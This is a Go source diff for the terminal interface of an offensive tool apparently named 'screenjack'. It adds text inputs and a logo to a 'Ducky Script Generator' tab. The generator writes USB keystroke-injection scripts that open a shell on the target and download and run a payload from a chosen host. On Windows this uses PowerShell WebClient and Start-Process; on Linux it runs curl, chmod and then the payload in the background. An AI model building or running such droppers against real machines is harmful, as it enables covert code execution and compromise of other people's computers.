@@ -12,6 +12,7 @@ import (
 	"github.com/charmbracelet/bubbles/help"
 	"github.com/charmbracelet/bubbles/key"
 	"github.com/charmbracelet/bubbles/list"
+	"github.com/charmbracelet/bubbles/textinput"
 	tea "github.com/charmbracelet/bubbletea"
 	"github.com/charmbracelet/lipgloss"
 )
@@ -67,14 +68,15 @@ func DefaultKeyMap() KeyMap {
 }
 
 func (k KeyMap) ShortHelp() []key.Binding {
-	return []key.Binding{k.Help, k.Tab, k.Build, k.Assets, k.Server, k.Quit}
+	return []key.Binding{k.Tab, k.Up, k.Down, k.Select, k.Build, k.Assets, k.Server, k.Quit}
 }
 
 func (k KeyMap) FullHelp() [][]key.Binding {
 	return [][]key.Binding{
-		{k.Up, k.Down, k.Select, k.SelectAll},
-		{k.Build, k.Assets, k.Generate},
-		{k.Server, k.Logs, k.Back, k.Quit},
+		{k.Tab, k.ShiftTab, k.Up, k.Down},
+		{k.Select, k.SelectAll, k.Build, k.Assets},
+		{k.Generate, k.Server, k.Logs, k.Back},
+		{k.Help, k.Quit},
 	}
 }
 
@@ -247,10 +249,11 @@ type TUIModel struct {
 	filePicker    filepicker.Model
 
 	// Ducky tab
-	duckyOS     string
-	duckyURL    string
-	payloadName string
-	duckyMsg    string
+	duckyOS      string
+	urlInput     textinput.Model
+	payloadInput textinput.Model
+	duckyFocus   int // 0=OS, 1=URL, 2=payload
+	duckyMsg     string
 
 	// Server tab
 	server   *Server
@@ -260,6 +263,13 @@ type TUIModel struct {
 	// Status
 	status string
 }
+
+const logo = `  ____                            _            _
+ / ___|  ___ _ __ ___  ___ _ __  (_) __ _  ___| | __
+ \___ \ / __| '__/ _ \/ _ \ '_ \ | |/ _` + "`" + ` |/ __| |/ /
+  ___) | (__| | |  __/  __/ | | || | (_| | (__|   <
+ |____/ \___|_|  \___|\___|_| |_|/ |\__,_|\___|_|\_\
+                               |__/                 `
 
 func NewTUIModel() TUIModel {
 	// Target list
@@ -288,23 +298,34 @@ func NewTUIModel() TUIModel {
 	fp.ShowHidden = false
 	fp.Height = 15
 
+	// Text inputs for Ducky tab
+	urlInput := textinput.New()
+	urlInput.Placeholder = "http://localhost:8000"
+	urlInput.SetValue("http://localhost:8000")
+	urlInput.Width = 30
+
+	payloadInput := textinput.New()
+	payloadInput.Placeholder = "screenjack"
+	payloadInput.SetValue("screenjack")
+	payloadInput.Width = 20
+
 	// Help
 	h := help.New()
 	h.ShowAll = false
 
 	return TUIModel{
-		activeTab:   TabBuild,
-		keys:        DefaultKeyMap(),
-		help:        h,
-		targetList:  targetList,
-		assetList:   assetList,
-		filePicker:  fp,
-		duckyOS:     "linux",
-		duckyURL:    "http://localhost:8000",
-		payloadName: "screenjack",
-		server:      NewServer(),
-		serverIP:    GetLocalIP(),
-		status:      "Ready",
+		activeTab:    TabBuild,
+		keys:         DefaultKeyMap(),
+		help:         h,
+		targetList:   targetList,
+		assetList:    assetList,
+		filePicker:   fp,
+		duckyOS:      "linux",
+		urlInput:     urlInput,
+		payloadInput: payloadInput,
+		server:       NewServer(),
+		serverIP:     GetLocalIP(),
+		status:       "Ready",
 	}
 }
 
@@ -525,12 +546,42 @@ func (m TUIModel) updateBuildTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 }
 
 func (m TUIModel) updateDuckyTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
-	switch msg.String() {
-	case "w":
-		if m.duckyOS == "linux" {
-			m.duckyOS = "windows"
+	// If a text input is focused, route to it
+	if m.urlInput.Focused() || m.payloadInput.Focused() {
+		switch msg.String() {
+		case "esc", "enter":
+			m.urlInput.Blur()
+			m.payloadInput.Blur()
+			return m, nil
+		}
+		var cmd tea.Cmd
+		if m.urlInput.Focused() {
+			m.urlInput, cmd = m.urlInput.Update(msg)
 		} else {
-			m.duckyOS = "linux"
+			m.payloadInput, cmd = m.payloadInput.Update(msg)
+		}
+		return m, cmd
+	}
+
+	switch {
+	case key.Matches(msg, m.keys.Up):
+		m.duckyFocus = max(0, m.duckyFocus-1)
+	case key.Matches(msg, m.keys.Down):
+		m.duckyFocus = min(2, m.duckyFocus+1)
+	case key.Matches(msg, m.keys.Select):
+		switch m.duckyFocus {
+		case 0: // Toggle OS
+			if m.duckyOS == "linux" {
+				m.duckyOS = "windows"
+			} else {
+				m.duckyOS = "linux"
+			}
+		case 1: // Focus URL input
+			m.urlInput.Focus()
+			return m, textinput.Blink
+		case 2: // Focus payload input
+			m.payloadInput.Focus()
+			return m, textinput.Blink
 		}
 	}
 	return m, nil
@@ -610,11 +661,12 @@ func (m *TUIModel) toggleServer() tea.Cmd {
 func (m *TUIModel) genDucky() {
 	var b strings.Builder
 
-	baseURL := m.duckyURL
+	baseURL := m.urlInput.Value()
+	payloadName := m.payloadInput.Value()
 	if m.server.IsRunning() {
 		baseURL = fmt.Sprintf("http://%s:%d", m.serverIP, m.server.Port())
 	}
-	url := strings.TrimSuffix(baseURL, "/") + "/" + m.payloadName
+	url := strings.TrimSuffix(baseURL, "/") + "/" + payloadName
 
 	b.WriteString(fmt.Sprintf("REM screenjack payload - target: %s\n", m.duckyOS))
 	b.WriteString(fmt.Sprintf("REM url: %s\n", url))
@@ -630,14 +682,14 @@ func (m *TUIModel) genDucky() {
 		b.WriteString("DELAY 500\n\n")
 		b.WriteString("REM Download and execute\n")
 		b.WriteString(fmt.Sprintf("STRING $u='%s';$p=\"$env:TEMP\\%s.exe\";(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p\n",
-			url, m.payloadName))
+			url, payloadName))
 		b.WriteString("ENTER\n")
 	} else {
 		b.WriteString("REM Open terminal\n")
 		b.WriteString("CTRL-ALT t\n")
 		b.WriteString("DELAY 500\n\n")
 		b.WriteString("REM Download, chmod, execute in background\n")
-		b.WriteString(fmt.Sprintf("STRING curl -sO %s && chmod +x %s && ./%s &\n", url, m.payloadName, m.payloadName))
+		b.WriteString(fmt.Sprintf("STRING curl -sO %s && chmod +x %s && ./%s &\n", url, payloadName, payloadName))
 		b.WriteString("ENTER\n")
 		b.WriteString("DELAY 300\n")
 		b.WriteString("STRING exit\n")
@@ -695,10 +747,9 @@ func (m TUIModel) viewTabs() string {
 		tabs = append(tabs, style.Render(i.String()))
 	}
 
-	title := styleTitle.Render("screenjack")
 	tabLine := strings.Join(tabs, "  ")
 
-	return fmt.Sprintf("  %s    %s", tabLine, title)
+	return styleTitle.Render(logo) + "\n\n  " + tabLine
 }
 
 func (m TUIModel) viewBuildTab() string {
@@ -723,9 +774,29 @@ func (m TUIModel) viewDuckyTab() string {
 
 	b.WriteString("  Ducky Script Generator\n")
 	b.WriteString("  ──────────────────────\n\n")
-	b.WriteString(fmt.Sprintf("  Target OS: %s  (w to toggle)\n", styleSuccess.Render(m.duckyOS)))
-	b.WriteString(fmt.Sprintf("  URL: %s\n", m.duckyURL))
-	b.WriteString(fmt.Sprintf("  Payload: %s\n", m.payloadName))
+
+	// OS selector
+	osCursor := "  "
+	osStyle := lipgloss.NewStyle()
+	if m.duckyFocus == 0 {
+		osCursor = "> "
+		osStyle = osStyle.Foreground(colorAmber).Bold(true)
+	}
+	b.WriteString(fmt.Sprintf("%sTarget OS: %s  (space to toggle)\n", osCursor, osStyle.Render(m.duckyOS)))
+
+	// URL input
+	urlCursor := "  "
+	if m.duckyFocus == 1 {
+		urlCursor = "> "
+	}
+	b.WriteString(fmt.Sprintf("%sURL: %s\n", urlCursor, m.urlInput.View()))
+
+	// Payload input
+	payloadCursor := "  "
+	if m.duckyFocus == 2 {
+		payloadCursor = "> "
+	}
+	b.WriteString(fmt.Sprintf("%sPayload: %s\n", payloadCursor, m.payloadInput.View()))
 
 	return b.String()
 }
